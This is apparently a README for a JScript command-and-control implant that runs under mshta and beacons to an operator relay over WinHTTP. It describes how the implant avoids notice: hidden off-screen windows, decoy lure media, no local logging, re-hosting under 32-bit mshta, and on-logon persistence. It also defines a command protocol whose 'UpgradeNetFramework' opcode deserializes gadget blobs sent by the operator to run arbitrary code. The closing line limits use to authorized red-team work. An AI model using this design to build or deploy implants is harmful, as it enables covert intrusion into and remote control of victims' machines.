# jscript-agent-debug

Minimal build of the JScript HTTP-beacon agent core for the
[C2](https://github.com/nostdlib/C2) platform — a single static
[`jscript-agent.js`](jscript-agent.js) that turns its host process (mshta in deployment, cscript
for verification) into an implant with no payload download, no CLR requirement, and no bitness
constraint of its own.

It is pure ES3-era JScript (the engine inside `mshta.exe` / `cscript.exe`, JScript 5.8) — no
`XMLHttpRequest` host object assumptions, no JSON, no `let`/arrow functions. Every COM object it
touches (`WScript.Shell`, `WinHttp.WinHttpRequest.5.1` for the beacon,
`WbemScripting.SWbemLocator`, `System.*` for the UpgradeNetFramework arm) is activated through
`ActiveXObject`. The beacon transport is winhttp.dll's own object — no MSXML in the network path —
because hardened boxes can deny the MSXML HTTP classes at `open()` with 0x80070005
"Access is denied".

## Environment contract

The agent carries **no baked configuration**. Its single input is the process environment:

| Variable | Meaning |
|---|---|
| `H_URL` | The beacon endpoint — the HTTP relay root (`https://<relay>/`). Empty or unset ⇒ the agent logs once and returns `'fail'`. |

Everything else (identity, machine architecture, OS version) is derived on the target at runtime.
`X-Client-Features` always ships `0800000000000000` (the
`ExploitInsecureDeserialization` bit, category 3) — every build of this agent carries
the UpgradeNetFramework arm.

## Host contract

`runAgent()` is designed to be **nested inside a host master** — a wrapper script that owns all
window and process manipulation. The agent itself performs none. Concretely:

- It defines exactly one top-level symbol: `function runAgent()`. Everything else is nested inside.
- It **returns** instead of exiting: `'exit'` (operator sent Exit), `'fail'` (endpoint unset,
  non-200 answer, or POST exception), or `'async'` (mshta only — see below). The host decides
  what to do — typically quit the host process on completion.
- **mshta is async**: mshta's slow-script watchdog pops a modal for any script activation that
  never yields — and behind the host master's hidden window that modal is invisible and blocking.
  Under mshta (`typeof setTimeout != 'undefined'` and no `WScript`) the beacon loop therefore runs
  one `setTimeout` activation per cycle, opens the transport async (`open(..., true)`) and peeks
  it with `waitForResponse(0)` on a 50 ms tick (90 s hard deadline); `runAgent()` returns
  `'async'` immediately after scheduling, and the final status is delivered by calling the
  host-defined **`onAgentDone(status)`** hook when the loop unwinds. The master gates on it:
  `if (runAgent() == 'async') return; quitHost();`. Under WSH (cscript/wscript — no timers, no
  watchdog) the loop stays fully synchronous and returns `'exit'`/`'fail'` directly;
  `onAgentDone` is never called there.
- **Logging is relay-ship only — zero local echo.** Every log line is POSTed with
  `X-Log-Only: 1` (the relay answers immediately, no long-poll hold, and broadcasts an
  `agent_log` event to the operator's feed). Ships are fire-and-forget, capped, and never fatal —
  a failed ship is swallowed in silence; no `Echo`, no `alert`, nothing hits the local console.
- It reads `H_URL` from the process environment, so the host must set it (e.g. via
  `WScript.Shell.Environment('Process')('H_URL') = ...`) **before** calling `runAgent()` — and
  must re-set it in any re-hosted copy of the process, since environment state is per-process.
- **Debug tail (this build):** executed directly under WSH (cscript/wscript, incl.
  double-click), this file self-runs `runAgent()` and shows the result in a MessageBox popup
  (see [Local verification](#local-verification)). Under the mshta deployment host the tail is
  inert (no `WScript` object), and no extra top-level symbol is defined — the host contract
  holds.

The C2 Windows-Infection master is the reference host: it emits `setHUrl()` (writes `H_URL`),
`openDecoy()` (lure media, gated to the x86 host), `hideWindow()` (resize + move off-screen),
`ensureX86Host()` (re-launch the polyglot under `%WINDIR%\SysWOW64\mshta.exe` on 64-bit hosts —
the x86 CLR is the only usable UpgradeNetFramework target on every 64-bit OS incl. ARM64), an
`onAgentDone(status) { quitHost(); }` hook, then:

```
setHUrl(); [openDecoy();] hideWindow(); if (ensureX86Host()) { exitProcess(); return; }
if (runAgent() == 'async') return; quitHost();
```

The x86 re-host matters because the UpgradeNetFramework-delivered deserialization chain needs an
x86 CLR process; the pure beacon loop runs in any bitness (and standalone under cscript).

## Beacon contract (v2)

Spoken against the HTTP relay (the beacon leg answers at its root):

- **POST** to `H_URL` with the full identity header set on every request; body =
  hex(previous command's response), empty body when none is pending.
- **Every successful answer is `200 text/plain`**: body = hex(next command) in the shared binary
  protocol (`[opcode][payload]`), empty body = nothing queued. There is no 204; any non-200 is
  fatal.
- The relay holds each request server-side for a random 20–30 s; the agent's receive timeout is
  45 s (keep receive > max-hold + 10 s if the relay window ever grows). On an empty body the agent
  re-POSTs immediately.
- **Failure is fatal**: a non-200 status or a POST exception logs once and returns `'fail'` — no
  retry loop, no sleep primitive. Presence is re-established by re-delivery (e.g. on-logon
  persistence), not by the process burning CPU against a dead relay.

### Commands

| Opcode | Command | Behavior |
|---|---|---|
| `0x0A` | Exit | Sets the exit flag; the loop unwinds and `runAgent()` returns `'exit'`. |
| `0x0B` | UpgradeNetFramework | Re-arms the process in place. Payload (ASCII text after the opcode): `!d=`/`!e=` control lines, `NAME=value` env-var lines, a blank line, then `stage1b64\nblobB64`. The agent pins `COMPLUS_Version` itself first (v2.0.50727 on Win7 / build 7600-7601, else v4.0.30319), applies the env lines, optionally deserializes the stage-1 blob, then deserializes the main gadget blob (plain drive, or script-driven delegate chain when `!d=1` + entry via `!e=`). Replies u32 as hex: `0` = chain completed, `1` = failed (log carries the message). |
| other | unknown | Replies u32 `2`. |

## Local verification

Double-click `jscript-agent.js` (or `wscript jscript-agent.js`): the result comes back as a
**MessageBox popup** — with `H_URL` unset it shows `result: fail` and auto-closes after 60 s
(set `DBG_ECHO=1` in the process environment to get the same line on the console instead):

```
cscript //nologo jscript-agent.js              :: MessageBox popup (same as double-click)
set DBG_ECHO=1 && cscript //nologo jscript-agent.js   :: console output instead
```

Expected with `H_URL` unset: `result: fail` and a clean exit — the "endpoint not set" log line
ships nowhere (relay-ship only, zero local echo). Against a live relay the beacon appears in
`/status` with its parsed identity and answers queued commands.

## Build & Release

There is nothing to compile — the source **is** the artifact. CI (`.github/workflows/build.yml`)
gates every push/PR with:

1. `node --check jscript-agent.js` — syntax gate;
2. a cscript smoke run on a Windows runner (`DBG_ECHO=1`, H_URL unset ⇒ exactly
   `result: fail`, no local log echo).

On every push to `main` the same workflow republishes the rolling GitHub Release
**`jscript-agent-debug`** with the syntax-checked `jscript-agent.js` as its asset.

---

Authorized red-team / pentest / research use only. MIT.
